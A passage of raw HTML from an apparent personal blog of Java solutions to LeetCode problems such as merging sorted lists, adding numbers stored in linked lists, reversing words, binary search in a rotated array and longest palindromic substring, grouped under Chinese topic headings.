class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;        </span><br><span class="line">        ListNode head=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode res = head;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="keyword">null</span>&amp;&amp;l2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1.val&lt;=l2.val)&#123;</span><br><span class="line">                 head.next=l1;</span><br><span class="line">                l1=l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                head.next=l2;</span><br><span class="line">                l2=l2.next;</span><br><span class="line">            &#125; </span><br><span class="line">            head=head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        head.next = l1==<span class="keyword">null</span>?l2:l1;</span><br><span class="line">        <span class="keyword">return</span> res.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="add-two-numbers">Add Two Numbers √</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 0 -&gt; 8</span><br><span class="line">Explanation: 342 + 465 &#x3D; 807.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>,carry=<span class="number">0</span>;</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode now = dummy;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="keyword">null</span>||l2!=<span class="keyword">null</span>||carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = l1==<span class="keyword">null</span>?<span class="number">0</span>:l1.val;</span><br><span class="line">            <span class="keyword">int</span> y = l2==<span class="keyword">null</span>?<span class="number">0</span>:l2.val;</span><br><span class="line">            sum = x+y+carry;</span><br><span class="line">            now.next=<span class="keyword">new</span> ListNode(sum%<span class="number">10</span>);</span><br><span class="line">            now=now.next;</span><br><span class="line">            carry=sum/<span class="number">10</span>;</span><br><span class="line">            l1 = l1==<span class="keyword">null</span>?<span class="keyword">null</span>:l1.next;</span><br><span class="line">            l2 = l2==<span class="keyword">null</span>?<span class="keyword">null</span>:l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="add-two-numbers-ii">Add Two Numbers II √</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 8 -&gt; 0 -&gt; 7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Integer&gt; s1 = <span class="keyword">new</span> Stack();</span><br><span class="line">        Stack&lt;Integer&gt; s2 = <span class="keyword">new</span> Stack();</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            s1.push(l1.val);</span><br><span class="line">            l1=l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            s2.push(l2.val);</span><br><span class="line">            l2=l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> carry=<span class="number">0</span>;</span><br><span class="line">        ListNode ans = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty()||!s2.isEmpty()||carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = s1.isEmpty()?<span class="number">0</span>:s1.pop();</span><br><span class="line">            <span class="keyword">int</span> y = s2.isEmpty()?<span class="number">0</span>:s2.pop();</span><br><span class="line">            <span class="keyword">int</span> sum = x+y+carry;</span><br><span class="line">            ListNode node = <span class="keyword">new</span> ListNode(sum%<span class="number">10</span>);</span><br><span class="line">            carry=sum/<span class="number">10</span>;</span><br><span class="line">            node.next=ans.next;</span><br><span class="line">            ans.next=node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="reverse-words-in-a-string-">Reverse Words in a String -</span></h2><p>Given an input string, reverse the string word by word. </p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;the sky is blue&quot;</span><br><span class="line">Output: &quot;blue is sky the&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;  hello world!  &quot;</span><br><span class="line">Output: &quot;world! hello&quot;</span><br><span class="line">Explanation: Your reversed string should not contain leading or trailing spaces.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>[] a = s.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> n = a.length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// step 1. reverse the whole string</span></span><br><span class="line">    reverse(a, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// step 2. reverse each word</span></span><br><span class="line">    reverseWords(a, n);</span><br><span class="line">    <span class="comment">// step 3. clean up spaces</span></span><br><span class="line">    <span class="keyword">return</span> cleanSpaces(a, n);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">reverseWords</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; j || i &lt; n &amp;&amp; a[i] == <span class="string">' '</span>) i++; <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; i || j &lt; n &amp;&amp; a[j] != <span class="string">' '</span>) j++; <span class="comment">// skip non spaces</span></span><br><span class="line">      reverse(a, i, j - <span class="number">1</span>);                      <span class="comment">// reverse the word</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// trim leading, trailing and multiple spaces</span></span><br><span class="line">  <span class="function">String <span class="title">cleanSpaces</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (j &lt; n) &#123;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] == <span class="string">' '</span>) j++;             <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] != <span class="string">' '</span>) a[i++] = a[j++]; <span class="comment">// keep non spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] == <span class="string">' '</span>) j++;             <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">if</span> (j &lt; n) a[i++] = <span class="string">' '</span>;                      <span class="comment">// keep only one space</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(a).substring(<span class="number">0</span>, i);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// reverse a[] from a[i] to a[j]</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">char</span> t = a[i];</span><br><span class="line">      a[i++] = a[j];</span><br><span class="line">      a[j--] = t;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="merge-k-sorted-lists-">Merge k Sorted Lists -</span></h2><p>Merge <em>k</em> sorted linked lists and return it as one sorted list. Analyze and describe its complexity.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeKLists</span><span class="params">(ListNode[] lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lists==<span class="keyword">null</span>||lists.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; q = <span class="keyword">new</span> PriorityQueue&lt;ListNode&gt;(lists.length, (a,b)-&gt; a.val-b.val);</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode tail=dummy;</span><br><span class="line">         <span class="keyword">for</span> (ListNode node:lists)</span><br><span class="line">            <span class="keyword">if</span> (node!=<span class="keyword">null</span>)</span><br><span class="line">                q.add(node);</span><br><span class="line">         <span class="keyword">while</span> (!q.isEmpty())&#123;</span><br><span class="line">            tail.next=q.poll();</span><br><span class="line">            tail=tail.next;            </span><br><span class="line">            <span class="keyword">if</span> (tail.next!=<span class="keyword">null</span>)</span><br><span class="line">                q.add(tail.next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="动态规划">动态规划</span></h1><h2><span id="climbing-stairs">Climbing Stairs √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">       dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">       dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">           dp[i%<span class="number">3</span>] = dp[(i - <span class="number">1</span>)%<span class="number">3</span>] + dp[(i - <span class="number">2</span>)%<span class="number">3</span>];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dp[n%<span class="number">3</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="栈">栈</span></h1><h2><span id="trapping-rain-water">Trapping Rain Water</span></h2><p>Given <em>n</em> non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.</p><p><img src="https://assets.leetcode.com/uploads/2018/10/22/rainwatertrap.png" alt="img"><br>The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. <strong>Thanks Marcos</strong> for contributing this image!</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,1,0,2,1,0,1,3,2,1,2,1]</span><br><span class="line">Output: 6</span><br></pre></td></tr></table></figure><h2><span id="simplify-path">Simplify Path</span></h2><p>Given an <strong>absolute path</strong> for a file (Unix-style), simplify it. Or in other words, convert it to the <strong>canonical path</strong>.</p><p>In a UNIX-style file system, a period <code>.</code> refers to the current directory. Furthermore, a double period <code>..</code> moves the directory up a level.</p><p>Note that the returned canonical path must always begin with a slash <code>/</code>, and there must be only a single slash <code>/</code> between two directory names. The last directory name (if it exists) <strong>must not</strong> end with a trailing <code>/</code>. Also, the canonical path must be the <strong>shortest</strong> string representing the absolute path.</p><p> <strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;&#x2F;home&#x2F;&quot;</span><br><span class="line">Output: &quot;&#x2F;home&quot;</span><br><span class="line">Explanation: Note that there is no trailing slash after the last directory name.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;&#x2F;..&#x2F;&quot;</span><br><span class="line">Output: &quot;&#x2F;&quot;</span><br><span class="line">Explanation: Going one level up from the root directory is a no-op, as the root level is the highest level you can go.</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;&#x2F;home&#x2F;&#x2F;foo&#x2F;&quot;</span><br><span class="line">Output: &quot;&#x2F;home&#x2F;foo&quot;</span><br><span class="line">Explanation: In the canonical path, multiple consecutive slashes are replaced by a single one.</span><br></pre></td></tr></table></figure><p><strong>Example 4:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;&#x2F;a&#x2F;.&#x2F;b&#x2F;..&#x2F;..&#x2F;c&#x2F;&quot;</span><br><span class="line">Output: &quot;&#x2F;c&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 5:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;&#x2F;a&#x2F;..&#x2F;..&#x2F;b&#x2F;..&#x2F;c&#x2F;&#x2F;.&#x2F;&#x2F;&quot;</span><br><span class="line">Output: &quot;&#x2F;c&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 6:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;&#x2F;a&#x2F;&#x2F;b&#x2F;&#x2F;&#x2F;&#x2F;c&#x2F;d&#x2F;&#x2F;.&#x2F;.&#x2F;&#x2F;..&quot;</span><br><span class="line">Output: &quot;&#x2F;a&#x2F;b&#x2F;c&quot;</span><br></pre></td></tr></table></figure><h1><span id="二分查找">二分查找</span></h1><h2><span id="search-in-rotated-sorted-array">Search in Rotated Sorted Array √</span></h2><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p><p>(i.e., <code>[0,1,2,4,5,6,7]</code> might become <code>[4,5,6,7,0,1,2]</code>).</p><p>You are given a target value to search. If found in the array return its index, otherwise return <code>-1</code>.</p><p>You may assume no duplicate exists in the array.</p><p>Your algorithm’s runtime complexity must be in the order of <em>O</em>(log <em>n</em>).</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [4,5,6,7,0,1,2], target &#x3D; 0</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [4,5,6,7,0,1,2], target &#x3D; 3</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(nums.length==<span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">int</span> lo=<span class="number">0</span>,hi=nums.length-<span class="number">1</span>,index=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(nums[lo]&lt;nums[hi]) ;</span><br><span class="line">       <span class="keyword">else</span> index=srch(nums);</span><br><span class="line">       <span class="keyword">if</span>(target&lt;=nums[hi]&amp;&amp;target&gt;=nums[index])<span class="keyword">return</span> bs(nums,index,hi,target);</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">return</span> bs(nums,lo,index-<span class="number">1</span>,target);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bs</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi,<span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line">       <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">           <span class="keyword">int</span> mid=(lo+hi)/<span class="number">2</span>;</span><br><span class="line">           <span class="keyword">if</span>(a[mid]&lt;target)lo=mid+<span class="number">1</span>;</span><br><span class="line">           <span class="keyword">else</span> hi=mid;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> a[lo]==target?lo:-<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">srch</span><span class="params">(<span class="keyword">int</span>[] a)</span></span>&#123;</span><br><span class="line">       <span class="keyword">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">           <span class="keyword">int</span> mid= lo +(hi-lo)/<span class="number">2</span>;</span><br><span class="line">           <span class="keyword">if</span>(a[mid]&gt;a[a.length-<span class="number">1</span>]) lo=mid+<span class="number">1</span>;</span><br><span class="line">           <span class="keyword">else</span> hi=mid;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> lo;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="双指针">双指针</span></h1><h2><span id="longest-substring-without-repeating-characters">Longest Substring Without Repeating Characters √</span></h2><p>Given a string, find the length of the <strong>longest substring</strong> without repeating characters.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;abcabcbb&quot;</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: The answer is &quot;abc&quot;, with the length of 3.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;bbbbb&quot;</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The answer is &quot;b&quot;, with the length of 1.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(s.charAt(i)))&#123;</span><br><span class="line">                j=Math.max(j,map.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(s.charAt(i),i);</span><br><span class="line">            res=Math.max(res,i-j+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="搜索">搜索</span></h1><h2><span id="longest-palindromic-substring">Longest Palindromic Substring ×</span></h2><p>Given a string <strong>s</strong>, find the longest palindromic substring in <strong>s</strong>. You may assume that the maximum length of <strong>s</strong> is 1000.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;babad&quot;</span><br><span class="line">Output: &quot;bab&quot;</span><br><span class="line">Note: &quot;aba&quot; is also a valid answer.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;cbbd&quot;</span><br><span class="line">Output: &quot;bb&quot;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> lo, maxLen;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len-<span class="number">1</span>; i++) &#123;</span><br><span class="line">            extendPalindrome(s, i, i);  <span class="comment">//assume odd length, try to extend Palindrome as possible</span></span><br><span class="line">            extendPalindrome(s, i, i+<span class="number">1</span>); <span class="comment">//assume even length.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(lo, lo + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">extendPalindrome</span><span class="params">(String s, <span class="keyword">int</span> j, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; k &lt; s.length() &amp;&amp; s.charAt(j) == s.charAt(k)) &#123;</span><br><span class="line">            j--;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (maxLen &lt; k - j - <span class="number">1</span>) &#123;</span><br><span class="line">            lo = j + <span class="number">1</span>;</span><br><span class="line">            maxLen = k - j - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id></span></h1><h1><span id="动态规划">动态规划</span></h1><h2><span id="maximum-subarray">Maximum Subarray √</span></h2><p>Given an integer array <code>nums</code>, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [-2,1,-3,4,-1,2,1,-5,4],</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [4,-1,2,1] has the largest sum &#x3D; 6.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 